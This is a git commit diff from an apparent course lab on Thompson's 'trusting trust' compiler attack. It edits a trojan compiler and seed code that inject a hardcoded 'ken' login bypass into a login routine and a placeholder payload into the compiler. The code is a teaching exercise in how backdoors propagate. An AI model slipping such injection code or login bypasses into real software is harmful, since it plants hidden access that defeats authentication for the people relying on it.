db9d00ac9a8c0856269a1d95e548bb256931979e
tharittk <tharit.tangkij@gmail.com>
2025-09-15 09:25:07 +0700

    saved - working login and compile but not replicate

--- labs/2-trusting-trust/code/step3/attack-seed.c
+++ labs/2-trusting-trust/code/step3/attack-seed.c
@@ -1,81 +1,75 @@
 // can put any payload here.
 // attack code
 
-    FILE *fp = fopen("./temp-out.c", "w");
-    assert(fp);
-    /*****************************************************************
-     * Step 1:
-     */
- 
-    // match on the start of the login() routine:
-    static char login_sig[] = "int login(char *user) {";
-    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
+/*****************************************************************
+ * Step 1:
+ */
 
-    char* match_ptr = strstr(program, login_sig);
-	char* new_prog = NULL;
+// match on the start of the login() routine:
+static char login_sig[] = "int login(char *user) {";
+static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-    if (match_ptr != NULL){
-        char* start_second_part = match_ptr + strlen(login_sig);
+char *match_ptr = strstr(program, login_sig);
+char *new_prog = NULL;
 
-        size_t len_first_part = match_ptr - program; 
-        size_t len_to_insert = strlen(login_attack);
-        size_t len_second_part = strlen(start_second_part);
-        size_t new_size = len_first_part + strlen(login_sig) + len_to_insert + len_second_part + 1;
+if (match_ptr != NULL)
+{
+    char *start_second_part = match_ptr + strlen(login_sig);
 
-        new_prog = malloc(sizeof(char) * new_size);
-        strncpy(new_prog, program, len_first_part);
-        new_prog[len_first_part] = '\0'; // for strcat
-        strcat(new_prog, login_sig);
-        strcat(new_prog, login_attack);
-        strcat(new_prog, start_second_part);
-    }
+    size_t len_first_part = match_ptr - program;
+    size_t len_to_insert = strlen(login_attack);
+    size_t len_second_part = strlen(start_second_part);
+    size_t new_size = len_first_part + strlen(login_sig) + len_to_insert + len_second_part + 1;
 
-    char* new_login = new_prog;
-    if (new_login != NULL){
-        fprintf(fp, "%s", new_login);
-        fclose(fp);
-    }
-       
-    /*****************************************************************
-     * Step 2:
-     */
+    new_prog = malloc(sizeof(char) * new_size);
+    strncpy(new_prog, program, len_first_part);
+    new_prog[len_first_part] = '\0'; // for strcat
+    strcat(new_prog, login_sig);
+    strcat(new_prog, login_attack);
+    strcat(new_prog, start_second_part);
 
-    // search for the start of the compile routine: 
-    static char compile_sig[] =
-            "static void compile(char *program, char *outname) {\n"
-            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
-            "    assert(fp);"
-            ;
+    fprintf(fp, "%s", new_prog);
+    fclose(fp);
+}
 
-    // and inject a placeholder "attack":
-    // inject this after the assert above after the call to fopen.
-    // not much of an attack.   this is just a quick placeholder.
-    static char compile_attack[] 
-              = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
- 
-    match_ptr = strstr(program, compile_sig);
+/*****************************************************************
+ * Step 2:
+ */
 
-    if (match_ptr != NULL){
-        char* start_second_part = match_ptr + strlen(compile_sig);
+// search for the start of the compile routine:
+static char compile_sig[] =
+    "static void compile(char *program, char *outname) {\n"
+    "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
+    "    assert(fp);";
 
-        size_t len_first_part = match_ptr - program; 
-        size_t len_to_insert = strlen(compile_attack);
-        size_t len_second_part = strlen(start_second_part);
-        size_t new_size = len_first_part + strlen(compile_sig) + len_to_insert + len_second_part + 1;
+// and inject a placeholder "attack":
+// inject this after the assert above after the call to fopen.
+// not much of an attack.   this is just a quick placeholder.
+static char compile_attack[] = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
-        new_prog = malloc(sizeof(char) * new_size);
-        strncpy(new_prog, program, len_first_part);
-        new_prog[len_first_part] = '\0'; // for strcat
-        strcat(new_prog, compile_sig);
-        strcat(new_prog, compile_attack);
-        strcat(new_prog, start_second_part);
-    }
+match_ptr = strstr(program, compile_sig);
 
-    // char* new_compile = new_prog;
-    program = new_prog;
-    prog_bytes = prog;
-    // if (new_compile != NULL){
-    //     fprintf(fp, "%s", new_compile);
-    //     fclose(fp);
-    // }
+if (match_ptr != NULL)
+{
+    char *start_second_part = match_ptr + strlen(compile_sig);
 
+    size_t len_first_part = match_ptr - program;
+    size_t len_to_insert = strlen(compile_attack);
+    size_t len_second_part = strlen(start_second_part);
+    size_t new_size = len_first_part + strlen(compile_sig) + len_to_insert + len_second_part + 1;
+
+    new_prog = malloc(sizeof(char) * new_size);
+    strncpy(new_prog, program, len_first_part);
+    new_prog[len_first_part] = '\0'; // for strcat
+    strcat(new_prog, compile_sig);
+    strcat(new_prog, compile_attack);
+    strcat(new_prog, start_second_part);
+}
+
+// char* new_compile = new_prog;
+program = new_prog;
+prog_bytes = prog;
+// if (new_compile != NULL){
+//     fprintf(fp, "%s", new_compile);
+//     fclose(fp);
+// }
--- labs/2-trusting-trust/code/step3/trojan-compiler2.c
+++ labs/2-trusting-trust/code/step3/trojan-compiler2.c
@@ -8,58 +8,66 @@
 #include <sys/types.h>
 #include <unistd.h>
 
+#define error(args...)           \
+    do                           \
+    {                            \
+        fprintf(stderr, ##args); \
+        exit(1);                 \
+    } while (0)
 
-#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)
-
-static void compile(char *program, char *outname) {
+static void compile(char *program, char *outname)
+{
     int i;
-    char* prog_bytes;
+    char *prog_bytes;
 
-    #include "attack-quine.c"
+    FILE *fp = fopen("./temp-out.c", "w");
+    assert(fp);
+#include "attack-quine.c"
 
     // #include assign program = new_program defined in the attacked code
     // also assign program_bytes = prog[]
     // print those bytes before the program
-    char buffer[50000];
-    int offset = 0;
+    // char buffer[50000];
+    // int offset = 0;
 
     // offset += snprintf(buffer + offset, sizeof(buffer) - offset, "%s\n");
-    offset += snprintf(buffer + offset, sizeof(buffer) - offset, "char prog[] = {\n");
-	for(i = 0; prog[i]; i++)
-		offset += snprintf(buffer + offset, sizeof(buffer) - offset, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
+    // offset += snprintf(buffer + offset, sizeof(buffer) - offset, "char prog[] = {\n");
+    // for (i = 0; prog[i]; i++)
+    //     offset += snprintf(buffer + offset, sizeof(buffer) - offset, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
 
-    offset += snprintf(buffer + offset, sizeof(buffer) - offset, "0 };\n");
+    // offset += snprintf(buffer + offset, sizeof(buffer) - offset, "0 };\n");
 
     // bytes & prog
-    strcat(buffer, program);
-    fprintf(fp, "%s", buffer);
-    // fprintf(fp, "%s", program);
+    // strcat(buffer, program);
+    // fprintf(fp, "%s", buffer);
+    fprintf(fp, "%s", program);
     fclose(fp);
     // gross, call gcc.
     char buf[1024];
     sprintf(buf, "gcc ./temp-out.c -o %s", outname);
-    if(system(buf) != 0)
+    if (system(buf) != 0)
         error("system failed\n");
 }
 
-#   define N  8 * 1024 * 1024
-static char buf[N+1];
+#define N 8 * 1024 * 1024
+static char buf[N + 1];
 
-int main(int argc, char *argv[]) {
-    if(argc != 4)
+int main(int argc, char *argv[])
+{
+    if (argc != 4)
         error("expected 4 arguments have %d\n", argc);
-    if(strcmp(argv[2], "-o") != 0)
+    if (strcmp(argv[2], "-o") != 0)
         error("expected -o as second argument, have <%s>\n", argv[2]);
 
     // read in the entire file.
     int fd;
-    if((fd = open(argv[1], O_RDONLY)) < 0)
+    if ((fd = open(argv[1], O_RDONLY)) < 0)
         error("file <%s> does not exist\n", argv[1]);
 
     int n;
-    if((n = read(fd, buf, N)) < 1)
+    if ((n = read(fd, buf, N)) < 1)
         error("invalid read of file <%s>\n", argv[1]);
-    if(n == N)
+    if (n == N)
         error("input file too large\n");
 
     // "compile" it.
